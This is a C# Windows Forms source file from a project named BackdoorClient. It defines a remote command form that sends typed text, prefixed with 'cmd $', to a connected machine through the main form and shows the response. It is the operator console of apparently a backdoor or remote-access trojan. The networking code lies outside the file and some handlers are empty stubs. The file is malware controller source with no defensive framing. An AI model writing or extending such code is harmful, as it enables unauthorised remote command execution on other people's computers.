using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BackdoorClient
{
    public partial class RemouteCmd : Form
    {
        public Form1 mainForm;

        public RemouteCmd(Form1 f)
        {
            mainForm = f;
            InitializeComponent();
        }

        private void RemouteCmd_Load(object sender, EventArgs e)
        {
            if (!mainForm.TestConnect())
            {
                this.Close();
                return;
            }
            //commandTextBox.KeyDown += new KeyPressEventHandler(EnterCommandText(this, new KeyPressEventArgs('s')));
        }
        private void EnterCommandText(object sender,KeyEventHandler e)
        {

        }
        private void sendButton_Click(object sender, EventArgs e)
        {
            consoleText.Text += "\n " + mainForm.SendCommandAndGetResponce("cmd $" + commandTextBox.Text);
        }

        private void commandTextBox_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
